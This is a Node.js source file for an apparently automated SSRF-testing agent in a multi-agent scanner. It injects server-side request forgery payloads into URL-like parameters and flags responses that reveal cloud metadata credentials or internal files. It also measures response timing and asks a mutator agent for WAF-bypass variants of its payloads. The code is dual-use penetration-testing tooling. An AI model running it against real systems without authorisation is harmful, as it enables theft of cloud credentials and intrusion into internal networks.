const BaseAgent = require('../core/BaseAgent');
const axios = require('axios');
const PAYLOADS = require('../utils/Payloads');

class SsrfAgent extends BaseAgent {
    constructor() {
        super('SsrfAgent', 'SPECIALIST');
        this.SSRF_INDICATORS = [
            // Cloud metadata indicators
            /ami-id/i, /instance-id/i, /security-credentials/i,
            /iam/i, /access.key/i, /secret.key/i,
            // Internal network indicators
            /root:/i, /daemon:/i, /localhost/i,
            // Error indicators suggesting internal reach
            /connection refused/i, /ECONNREFUSED/i, /no route to host/i
        ];
    }

    async process(task) {
        if (task.type === 'TASK_ASSIGNED') {
            await this.executeAttack(task.payload);
            this.emitComplete();
        }
    }

    async executeAttack(payload) {
        this.log(`🌐 Testing SSRF: ${payload.url}`);

        // Identify URL-accepting parameters
        const urlParams = this._identifyUrlParams(payload);
        if (urlParams.length === 0) {
            this.log(`⏭️ No URL-accepting parameters found, skipping`);
            return;
        }

        for (const param of urlParams) {
            for (const ssrfPayload of PAYLOADS.ssrf) {
                try {
                    const response = await this._testSsrf(payload, param, ssrfPayload);

                    // Check for cloud metadata
                    if (this._hasCloudMetadata(response.body)) {
                        this.verifyAndEmit(
                            {
                                type: 'SSRF', severity: 'CRITICAL', title: 'SSRF — Cloud Metadata Exposure',
                                description: `Server fetched cloud metadata via param: ${param.key}`, endpoint: payload.url, payload: ssrfPayload
                            },
                            { method: 'data_leak', evidence: response.body.substring(0, 500) }
                        );
                        return;
                    }

                    // Check for internal network access (different response than baseline)
                    if (this._hasInternalIndicators(response.body) && response.status === 200) {
                        this.verifyAndEmit(
                            {
                                type: 'SSRF', severity: 'HIGH', title: 'SSRF — Internal Network Access',
                                description: `Server made request to internal resource via param: ${param.key}`, endpoint: payload.url, payload: ssrfPayload
                            },
                            { method: 'data_leak', evidence: `Target: ${ssrfPayload}\nResponse: ${response.body.substring(0, 300)}` }
                        );
                    }

                    // Timing-based detection: internal requests often respond faster
                    if (ssrfPayload.includes('169.254') || ssrfPayload.includes('127.0.0.1')) {
                        const start = Date.now();
                        await this._testSsrf(payload, param, ssrfPayload);
                        const elapsed = Date.now() - start;

                        // Compare to external request timing
                        const extStart = Date.now();
                        await this._testSsrf(payload, param, 'https://httpbin.org/delay/3');
                        const extElapsed = Date.now() - extStart;

                        if (elapsed < 1000 && extElapsed > 2000) {
                            this.verifyAndEmit(
                                {
                                    type: 'SSRF', severity: 'MEDIUM', title: 'Potential SSRF (Timing-Based)',
                                    description: `Internal (${elapsed}ms) significantly faster than external (${extElapsed}ms)`, endpoint: payload.url, payload: ssrfPayload
                                },
                                { method: 'timing', evidence: `Internal: ${elapsed}ms, External: ${extElapsed}ms` }
                            );
                        }
                    }

                    // WAF Bypass
                    if (response.status === 403 || response.status === 406) {
                        try {
                            const mutationResult = await this.askAgent('PayloadMutator', 'REQUEST_MUTATION', {
                                payload: ssrfPayload,
                                errorResponse: response.body,
                                errorStatus: response.status,
                                vulnerabilityType: 'SSRF'
                            }, 15000);

                            for (const mutated of (mutationResult.mutations || [])) {
                                const mutResp = await this._testSsrf(payload, param, mutated);
                                if (this._hasCloudMetadata(mutResp.body) || this._hasInternalIndicators(mutResp.body)) {
                                    this.verifyAndEmit(
                                        {
                                            type: 'SSRF', severity: 'CRITICAL', title: 'SSRF (WAF Bypassed)',
                                            description: `WAF bypassed: ${mutated}`, endpoint: payload.url, payload: mutated
                                        },
                                        { method: 'data_leak', evidence: mutResp.body.substring(0, 300) }
                                    );
                                    return;
                                }
                            }
                        } catch (err) {
                            this.log(`❌ Mutation timeout: ${err.message}`);
                        }
                    }

                } catch (e) {
                    // Network error, skip
                }
            }
        }
    }

    _identifyUrlParams(payload) {
        const params = [];
        const urlLikeKeys = ['url', 'uri', 'link', 'href', 'src', 'source', 'target', 'redirect', 'callback', 'next', 'return', 'goto', 'dest', 'destination', 'continue', 'fetch', 'proxy', 'image', 'img'];

        if (payload.params) {
            for (const key of Object.keys(payload.params)) {
                if (urlLikeKeys.some(u => key.toLowerCase().includes(u))) {
                    params.push({ key, location: 'query' });
                }
            }
        }

        if (payload.body && typeof payload.body === 'object') {
            for (const key of Object.keys(payload.body)) {
                if (urlLikeKeys.some(u => key.toLowerCase().includes(u))) {
                    params.push({ key, location: 'body' });
                }
            }
        }

        // If no explicit URL params found, try all params as potential vectors
        if (params.length === 0 && payload.params) {
            for (const key of Object.keys(payload.params)) {
                params.push({ key, location: 'query' });
            }
        }

        return params;
    }

    async _testSsrf(payload, param, ssrfPayload) {
        let url = payload.url;
        let body = payload.body;

        if (param.location === 'query') {
            const urlObj = new URL(payload.url);
            urlObj.searchParams.set(param.key, ssrfPayload);
            url = urlObj.toString();
        } else if (param.location === 'body') {
            body = { ...(payload.body || {}), [param.key]: ssrfPayload };
        }

        return this._sendRequest(url, payload.method, payload.headers, body, payload.cookies);
    }

    _hasCloudMetadata(body) {
        return /ami-id|instance-id|security-credentials|computeMetadata|ecs.*task/i.test(body);
    }

    _hasInternalIndicators(body) {
        return this.SSRF_INDICATORS.some(p => p.test(body));
    }

    async _sendRequest(url, method, headers, data, cookies) {
        try {
            const config = {
                url, method: method || 'GET',
                headers: { ...headers, ...(cookies ? { Cookie: cookies } : {}) },
                data, timeout: 10000,
                validateStatus: () => true
            };
            const resp = await axios(config);
            return { status: resp.status, body: typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data) };
        } catch (e) {
            return { status: 0, body: e.message };
        }
    }
}

module.exports = new SsrfAgent();
